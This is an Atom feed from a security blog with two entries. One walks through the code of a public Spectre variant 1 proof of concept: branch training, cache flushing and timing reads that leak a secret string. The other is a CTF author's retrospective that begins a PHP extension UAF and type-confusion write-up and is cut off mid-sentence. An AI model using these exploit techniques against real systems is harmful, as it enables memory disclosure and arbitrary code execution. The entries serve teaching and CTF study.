<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>SuperGate</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-03-12T02:55:46.247Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>SuperGate</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Spectre and Cache</title>
    <link href="http://example.com/2021/02/22/Spectre%20and%20Cache/"/>
    <id>http://example.com/2021/02/22/Spectre%20and%20Cache/</id>
    <published>2021-02-22T09:09:43.420Z</published>
    <updated>2021-03-12T02:55:46.247Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#resources">Resources</a></li><li><a href="#cache">Cache</a></li><li><a href="#branch-prediction-and-speculative-execution">Branch Prediction and Speculative Execution</a></li><li><a href="#how-does-poc-work">How does PoC work?</a></li><li><a href="#postscript">Postscript</a></li></ul><!-- tocstop --><h1><span id="resources">Resources</span></h1><ul><li><a href="https://www.freebuf.com/column/161135.html">https://www.freebuf.com/column/161135.html</a></li><li><a href="https://bbs.pediy.com/thread-230310.htm#msg_header_h1_0">https://bbs.pediy.com/thread-230310.htm#msg_header_h1_0</a></li><li><a href="https://github.com/Eugnis/spectre-attack">https://github.com/Eugnis/spectre-attack</a></li></ul><h1><span id="cache">Cache</span></h1><p>We all know that it takes much time when CPU accessing memory considering CPU caculation speed. In order to reduce the large amount of time consumption caused by CPU access, <code>cache</code> arised. </p><p><strong>This article will not introduce the exact structure of memory, if you get interested in it, please refer to <a href="https://en.wikipedia.org/wiki/Cache_(computing)">this</a>.</strong></p><p>Let’s assume that our computer will do this operation:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmp = Array[x];</span><br></pre></td></tr></table></figure><p>CPU is trying to get <code>Array[x]</code> from cache first instead of memory, and here are two situations:</p><ol><li><code>Array[x]</code> is in the cache, so CPU gets its value.</li><li><code>Array[x]</code> is not in the cache, so CPU needs to access memory to get its value, which will cost more time.</li></ol><h1><span id="branch-prediction-and-speculative-execution">Branch Prediction and Speculative Execution</span></h1><p>Modern CPUs are multi-core and multi-threaded, that is, support parallel execution of instructions. Therefore, if there is a branch jump condition that is related to a data, but the cache does not hit the data and can only perform the memory fetch operation, the program will not serially block to wait for the end of the memory fetch to perform the branch jump, but will attempt to perform branch prediction and speculative execution. When the memory data read by the CPU comes back, the CPU then confirms according to the content of the data and the logic of the branch condition whether its speculative execution is valid, and if it is invalid, the calculation result is discarded and restored to the previous state. If effective, continue execution, which greatly improves the efficiency of the CPU.</p><p>But here is the thing: If the result of speculative execution is discarded, the code executed during speculative execution may still affect the CPU cache. When the CPU is restoring the state, the cache will not be restored, and the CPU will only restore the state of the related registers.</p><p>Let’s look at this demo:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// a1_size and a2 are not in the cache</span></span><br><span class="line"><span class="keyword">if</span> (idx &lt; a1_size) &#123;</span><br><span class="line">    tmp = a2[a1[idx]];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In the demo above, CPU knows that it is a conditional judgment, and because <code>a1_size</code> is not in the cache, CPU needs to access memory to get the value.</p><p>Then, CPU saves a checkpoint, and executes instructions behind speculatively, which means that CPU treats <code>idx</code> as a variable that is smaller than <code>a1_size</code>. If <code>idx</code> is large enough, it will cause OOB reading, and <code>a1[idx]</code> will be treated as an index of <code>a2</code> and CPU will access memory based on <code>a1[idx]</code>. Finally accessed data in <code>a2</code> will be submitted from the memory to the CPU cache.</p><p>When <code>a1_size</code> is read from the memory, the CPU checks the branch condition again, and it finds that it does not meet the condition and cannot continue execution. So it will discard the current calculation result, then restore to the previous state, and continue to execute the code of another branch. But the data in <code>a2</code> has been submitted to the CPU cache.</p><p>The demo may be a little bit different from real <a href="https://github.com/Eugnis/spectre-attack">PoC</a>, but it’s easier for us to understand.</p><h1><span id="how-does-poc-work">How does PoC work?</span></h1><p>The content we want to leak is defined:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* secret = <span class="string">&quot;The Magic Words are Squeamish Ossifrage.&quot;</span>;</span><br></pre></td></tr></table></figure><p><code>malicious_x</code> is the shift of <code>secret</code> relative to <code>array1</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> malicious_x = (<span class="keyword">size_t</span>)(secret - (<span class="keyword">char</span> *)array1); <span class="comment">/* default for malicious_x */</span></span><br></pre></td></tr></table></figure><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> score[<span class="number">2</span>], len = <span class="built_in">strlen</span>(secret);</span><br><span class="line"><span class="keyword">uint8_t</span> value[<span class="number">2</span>];</span><br></pre></td></tr></table></figure><ul><li><p><code>value[0]</code> stores the character with the highest hit (the most likely character)</p></li><li><p><code>value[1]</code> stores the character with the second highest hit</p></li><li><p><code>score[0]</code> stores the number of hits with the highest character</p></li><li><p><code>score[1]</code> stores the number of hits for the second highest character</p></li></ul><p>Guess the data byte by byte:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (--len &gt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Reading at malicious_x = %p... &quot;</span>, (<span class="keyword">void</span> *)malicious_x);</span><br><span class="line">readMemoryByte(malicious_x++, value, score);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s: &quot;</span>, (score[<span class="number">0</span>] &gt;= <span class="number">2</span> * score[<span class="number">1</span>] ? <span class="string">&quot;Success&quot;</span> : <span class="string">&quot;Unclear&quot;</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%02X=&#x27;%c&#x27; score=%d &quot;</span>, value[<span class="number">0</span>],</span><br><span class="line">       (value[<span class="number">0</span>] &gt; <span class="number">31</span> &amp;&amp; value[<span class="number">0</span>] &lt; <span class="number">127</span> ? value[<span class="number">0</span>] : <span class="string">&#x27;?&#x27;</span>), score[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span> (score[<span class="number">1</span>] &gt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;(second best: 0x%02X=&#x27;%c&#x27; score=%d)&quot;</span>, value[<span class="number">1</span>],</span><br><span class="line">   (value[<span class="number">1</span>] &gt; <span class="number">31</span> &amp;&amp; value[<span class="number">1</span>] &lt; <span class="number">127</span> ? value[<span class="number">1</span>] : <span class="string">&#x27;?&#x27;</span>),</span><br><span class="line">   score[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Let’s look inside <code>readMemoryByte</code> to see what happens.</p><p>In this function, we will try 1000 times to guess the answer, and break if the confidence condition is met:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (results[j] &gt;= (<span class="number">2</span> * results[k] + <span class="number">5</span>) || (results[j] == <span class="number">2</span> &amp;&amp; results[k] == <span class="number">0</span>))</span><br><span class="line"><span class="keyword">break</span>; <span class="comment">/* Clear success if best is &gt; 2*runner-up + 5 or 2/0) */</span></span><br></pre></td></tr></table></figure><p>At the beginning, we need to flush <code>array2</code> from cache:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">_mm_clflush(&amp;array2[i * <span class="number">512</span>]); <span class="comment">/* intrinsic for clflush instruction */</span></span><br></pre></td></tr></table></figure><p>Then there is another loop of 30 times. In this loop, it can be regarded as 5 6-cycles. The first 5 cycles are used to train the CPU, and then the conditional branch prediction is triggered for the last:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */</span></span><br><span class="line">training_x = tries % array1_size;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">29</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line">_mm_clflush(&amp;array1_size);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">volatile</span> <span class="keyword">int</span> z = <span class="number">0</span>; z &lt; <span class="number">100</span>; z++)</span><br><span class="line">&#123;</span><br><span class="line">&#125; <span class="comment">/* Delay (can also mfence) */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */</span></span><br><span class="line"><span class="comment">/* Avoid jumps in case those tip off the branch predictor */</span></span><br><span class="line">x = ((j % <span class="number">6</span>) - <span class="number">1</span>) &amp; ~<span class="number">0xFFFF</span>; <span class="comment">/* Set x=FFF.FF0000 if j%6==0, else x=0 */</span></span><br><span class="line">x = (x | (x &gt;&gt; <span class="number">16</span>)); <span class="comment">/* Set x=-1 if j%6=0, else x=0 */</span></span><br><span class="line">x = training_x ^ (x &amp; (malicious_x ^ training_x));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        j % 6 == 0 -&gt; x = malicious_x</span></span><br><span class="line"><span class="comment">        j % 6 != 0 -&gt; x = training_x</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Call the victim! */</span></span><br><span class="line">victim_function(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>After these 30 cycles, through side-channel attacks, the access time of each item in <code>array2</code> is counted, and the ASCII value of the string is deduced:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Time reads. Order is lightly mixed up to prevent stride prediction */</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">mix_i = ((i * <span class="number">167</span>) + <span class="number">13</span>) &amp; <span class="number">255</span>;</span><br><span class="line">addr = &amp;array2[mix_i * <span class="number">512</span>];</span><br><span class="line">time1 = __rdtscp(&amp;junk); <span class="comment">/* READ TIMER */</span></span><br><span class="line">junk = *addr; <span class="comment">/* MEMORY ACCESS TO TIME */</span></span><br><span class="line">time2 = __rdtscp(&amp;junk) - time1; <span class="comment">/* READ TIMER &amp; COMPUTE ELAPSED TIME */</span></span><br><span class="line"><span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD &amp;&amp; mix_i != array1[tries % array1_size])</span><br><span class="line">results[mix_i]++; <span class="comment">/* cache hit - add +1 to score for this value */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>At last, we need to find the highest and second highest results:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Locate highest &amp; second-highest results results tallies in j/k */</span></span><br><span class="line">j = k = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (j &lt; <span class="number">0</span> || results[i] &gt;= results[j])</span><br><span class="line">&#123;</span><br><span class="line">k = j;</span><br><span class="line">j = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (k &lt; <span class="number">0</span> || results[i] &gt;= results[k])</span><br><span class="line">&#123;</span><br><span class="line">k = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>As for <code>victim_function</code>, it’s similiar to the demo mentioned above:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint8_t</span> temp = <span class="number">0</span>; <span class="comment">/* Used so compiler won&#x27;t optimize out victim_function() */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">victim_function</span><span class="params">(<span class="keyword">size_t</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (x &lt; array1_size) <span class="comment">// bound check</span></span><br><span class="line">&#123;</span><br><span class="line">temp &amp;= array2[array1[x] * <span class="number">512</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The first 5 cycles are essentially a kind of training for the CPU. Therefore, when the branch judgment of the sixth cycle causes speculative execution, the CPU is more inclined to choose the “no cross-border” branch, and therefore speculative execution. After the boundary check fails, the speculative execution result is discarded, but the value of <code>array2[array1[x] * 512]</code> has been stored in the cache. When reading the content of <code>array2[mix_t * 512]</code>, if you find that the reading time is abnormally fast, you can determine that <code>mix_t</code> is the answer.</p><h1><span id="postscript">Postscript</span></h1><p><code>CPU Spectre</code> is a novel cache-level attack method. However, this attack method also has its limitations, that is, the attacker needs to have a greater degree of freedom in the entire memory allocation and process control, and it is difficult to find such an exploit at the application level.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#resources&quot;&gt;Resources&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#cache&quot;&gt;Cache&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#branch-prediction-and-specu</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>AntCTF x D^3CTF 2021</title>
    <link href="http://example.com/2021/02/20/d3ctf%202021/d3ctf%202021/"/>
    <id>http://example.com/2021/02/20/d3ctf%202021/d3ctf%202021/</id>
    <published>2021-02-20T09:36:00.469Z</published>
    <updated>2021-03-12T10:37:47.770Z</updated>
    
    <content type="html"><![CDATA[<p><em>I am honored to be one of the questioners of <code>AntCTF x D^3CTF 2021</code>.<br>In this competition, I came up with 2 pwnable challenges, and tested several pwnable challenges.</em></p><p><em>This article records my experience before and after the question, as well as some lessons.</em></p><!-- toc --><ul><li><a href="#before-the-competition">Before the competition</a><ul><li><a href="#disappeared-d3ctf-2020">Disappeared D3CTF 2020</a></li><li><a href="#upcoming-d3ctf-2021">Upcoming D3CTF 2021</a><ul><li><a href="#kernel-pwn-with-fine-grained-kaslr-and-jit-rop">kernel pwn with fine-grained kaslr and JIT-ROP</a></li><li><a href="#php-extension-and-php-uaf">php extension and php UAF</a></li><li><a href="#qemu-escape">qemu escape</a></li><li><a href="#tsx">TSX</a></li></ul></li></ul></li><li><a href="#after-the-game-and-writeups">After the game and Writeups</a><ul><li><a href="#hackphp">Hackphp</a><ul><li><a href="#preview">Preview</a></li><li><a href="#type-confusion-in-php">Type-confusion in PHP</a></li><li><a href="#details">Details</a></li><li><a href="#exp">exp</a></li></ul></li><li><a href="#liproll">Liproll</a><ul><li><a href="#exp-1">exp</a></li></ul></li></ul></li></ul><!-- tocstop --><h1><span id="before-the-competition">Before the competition</span></h1><h2><span id="disappeared-d3ctf-2020">Disappeared D3CTF 2020</span></h2><p>There should be <code>D3CTF 2020</code> last year, but it was cancelled for some reasons. </p><p>At that time I was conceiving a challenge about <code>kernel pwn</code> and <code>integer overflow</code>, which originated from <code>CVE-2017-16995</code>, a <code>eBPF-related</code> vulnerability. I designed a VM inside the vulnerable kernel module, and due to the symbol asymmetry when comparing operands, it led to cross-border access.</p><p>But it was to hard to be debugged, as well as the exploit… And the most important thing is, the challenge itself is not novel enough, which is contrary to the theme of this competition.</p><p>The cancellation of <code>D3CTF 2020</code> is very regrettable, however, it gave me a chance to calm down, and learn more things to conceived better questions.</p><h2><span id="upcoming-d3ctf-2021">Upcoming D3CTF 2021</span></h2><p>Thanks to the support from <code>Ant Security</code> and the cooperation of <code>Vidar-team, L-team and CNSS</code>, <code>AntCTF x D^3CTF 2021</code> will arise in March, 2021. And I think it’s time for me to settle down the challenges in the competition.</p><p>I decided to come up some challenges based on the points listed below:</p><h3><span id="kernel-pwn-with-fine-grained-kaslr-and-jit-rop">kernel pwn with fine-grained kaslr and JIT-ROP</span></h3><p>A <a href="https://ctftime.org/task/14383">challenge</a> in <code>hxpctf 2020</code> inspired me.</p><p>In this challenge, the functions were in seperate sections. We couldn’t know the real function offset because each section was loaded into memory independently every time we start the kernel, which means that it is impossible for us to find gadgets in static environment. The official write-up told us that we can use <code>.symtab</code> section, a symbol table used to store information about functions and global variables that are defined and referenced in the program, to get the exact function addresss.</p><p>After solving the challenge, I was wondering if there is any other way to reach the root shell instead of using <code>.symtab</code> section to caculate the real offsets of the functions needed. And I notice that if <code>memory leak vulnerability</code> exists, we can use <code>JIT-ROP</code>, or some tricks like that, to find the real gadgets’ address. </p><h3><span id="php-extension-and-php-uaf">php extension and php UAF</span></h3><p>Months ago, my teammates <code>@ccdragon and @eniv</code> helped me to debug a <a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">php uaf exploit</a>, and I learned a lot php debug skills from that.</p><p>As there are few challenges about php extension in <code>ctf-pwn</code>, I decided to construct a vulnerability in php extension. It’s going to be a attractive challenge, I think.</p><h3><span id="qemu-escape">qemu escape</span></h3><p>Honestly, I am interested in this kind of problem, but I don’t have any new ideas about qemu escape challenge.</p><h3><span id="tsx">TSX</span></h3><p>A problem from <code>defcon 2019</code> attracted me a lot. You can refer to <a href="http://blog.ret2.io/2019/06/26/attacking-intel-tsx/#transactional-jailing">this blog</a> to explore more.</p><p>It’s a novel and CPU-level attack, and our goal is to release the lock to escape the transaction, and finally execute our shellcode.</p><p>But the thing is, as the blog mentioned above states, due to the unique scenario modeled by this CTF challenge, it is unlikely that this issue poses a risk to real-world applications, and what’s more, the uniqueness of this attack method also determines that it is difficult to construct new attack ideas.</p><h1><span id="after-the-game-and-writeups">After the game and Writeups</span></h1><p>Every single member of us played an important role in this game, which made the competition an outstanding and widely acclaimed one. But in the process of the game, there were many problems in the deployment environment of the challenge and the challenge itself, which caused a lot of troubles for the participating teams. Sometimes we got unexpected solutions, and those are much different from the solutions we expected…</p><p>After collecting the writeups of the top ranked teams, I carefully checked them and learned a lot of new ideas. At the same time, I realized the shortcomings of the challenges. Here are my opinions about several challenges.</p><h3><span id="hackphp">Hackphp</span></h3><h4><span id="preview">Preview</span></h4><p>An easy <code>php pwn</code> challenge. This challenge is designed for challengers to use the vulnerability in <code>php extension</code> to execute arbitrary code.</p><p>Check <code>hackphp.so</code> carefully, and we can find the functions listed below: </p><ul><li><code>hackphp_create</code>, creates a buffer with the length of <code>size</code>, and stores the <code>buffer pointer</code> in <code>buf</code> </li><li><code>hackphp_delete</code>, use <code>efree</code> to release <code>buf</code> and reset it to <code>null</code></li><li><code>hackphp_edit</code>, edit the buffer memory pointed by <code>buf</code></li><li><code>hackphp_get</code>, get the content of memory pointed by <code>buf</code></li></ul><p>And here we get the vulnerability in <code>hackphp_create</code>:</p><blockquote><p>If we try to create a buffer with <code>size &lt; 0x100 || size &gt; 0x200</code>, then <code>efree(buf)</code> will be execute but <code>buf</code> will not be resetted to <code>null</code>, which caused a traditional <code>UAF</code> problem. </p></blockquote><p>And now it’s pretty easy, because they (objects defined in <code>.php</code> source and <code>buf</code>) share the same heap memory, we can use the vulnerability to make an object and a buffer been allocated at the same place (make sure that the size of the object and the buffer should be the same). At last we can reach <code>/readflag</code> by <code>type-confusion</code>.</p><h4><span id="type-confusion-in-php">Type-confusion in PHP</span></h4><p>How should we use <code>type-confusion</code> in <code>PHP</code>? Let’s check it out.</p><p><strong>demo.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$obj</span> = <span class="keyword">new</span> myClass();</span><br><span class="line">    <span class="variable">$obj</span>-&gt;<span class="variable">$a</span> = &#123;&#125;;</span><br><span class="line">    <span class="variable">$obj</span>-&gt;<span class="variable">$b</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$x</span></span>) </span>&#123;&#125;;</span><br><span class="line">    <span class="variable">$obj</span>-&gt;<span class="variable">$c</span> = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="variable">$obj</span>-&gt;<span class="variable">$d</span> = <span class="number">1.111111</span>;</span><br><span class="line">    var_dump(<span class="variable">$obj</span>);</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>To figure out the memory layout of <code>$obj</code>, we can set breakpoint like this:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b php_var_dump</span></span><br><span class="line">Breakpoint 1 at 0x4055c0: file /home/supergate/php-src/ext/standard/var.c, line 93.</span><br></pre></td></tr></table></figure><p>Run <code>php demo.php</code>, and we can get:</p><p><img src="php_var_dump.png"></p><p>We should understand that <code>zval *struc</code> points to the memory space of <code>$obj</code>. PHP variables are stored by <code>zval</code>, and here we can try out to look at the memory layout:</p><p><img src="memory_layout.png"></p><p>The type of variable is defined by <code>zval-&gt;v-&gt;type</code>, whose related information is mentioned in <code>zend_types.h</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">/* regular data types */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_UNDEF0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_NULL1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_FALSE2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_TRUE3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_LONG4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_DOUBLE5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_STRING6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_ARRAY7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_OBJECT8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_RESOURCE9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_REFERENCE10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* constant expressions */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_CONSTANT_AST11</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* internal types */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_INDIRECT             13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_PTR14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_ALIAS_PTR15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IS_ERROR15</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* fake types used only for type hinting (Z_TYPE(zv) can not use them) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IS_BOOL16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_CALLABLE17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_ITERABLE18</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_VOID19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IS_NUMBER20</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>We can see that the type of <code>$obj</code> is <code>object</code>.<br>Let’s look deeper into <code>$obj</code>:</p><p><img src="hex_obj.png"></p><p>The contents from <code>0x7ffff587d028</code> to <code>0x7ffff587d060</code> are the properties of <code>$obj</code>. And we should notice that <code>0x7ffff585c500</code> is the pointer to <code>$obj-&gt;b</code>, which is a <code>Anonymous function</code>, and in PHP kernel, <code>Anonymous function</code> is represented by <code>zend_closure</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_closure</span> &#123;</span></span><br><span class="line">zend_object       <span class="built_in">std</span>;</span><br><span class="line">zend_function     func;</span><br><span class="line">zval              this_ptr;</span><br><span class="line">zend_class_entry *called_scope;</span><br><span class="line">zif_handler       orig_internal_handler;</span><br><span class="line">&#125; zend_closure;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> _<span class="title">zend_function</span> &#123;</span></span><br><span class="line">zend_uchar type;<span class="comment">/* MUST be the first element of this struct! */</span></span><br><span class="line"><span class="keyword">uint32_t</span>   quick_arg_flags;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">zend_uchar type;  <span class="comment">/* never used */</span></span><br><span class="line">zend_uchar arg_flags[<span class="number">3</span>]; <span class="comment">/* bitset of arg_info.pass_by_reference */</span></span><br><span class="line"><span class="keyword">uint32_t</span> fn_flags;</span><br><span class="line">zend_string *function_name;</span><br><span class="line">zend_class_entry *scope;</span><br><span class="line">zend_function *prototype;</span><br><span class="line"><span class="keyword">uint32_t</span> num_args;</span><br><span class="line"><span class="keyword">uint32_t</span> required_num_args;</span><br><span class="line">zend_arg_info *arg_info;</span><br><span class="line">&#125; common;</span><br><span class="line"></span><br><span class="line">zend_op_array op_array;</span><br><span class="line">zend_internal_function internal_function; <span class="comment">// our target</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>In order to execute malicious function, we should replace <code>internal_function</code> to the address of the function. At the same time, we should ensure the integrity of <code>zend_closure</code>, otherwise the program will crash.</p><p>Because of the <code>UAF</code> 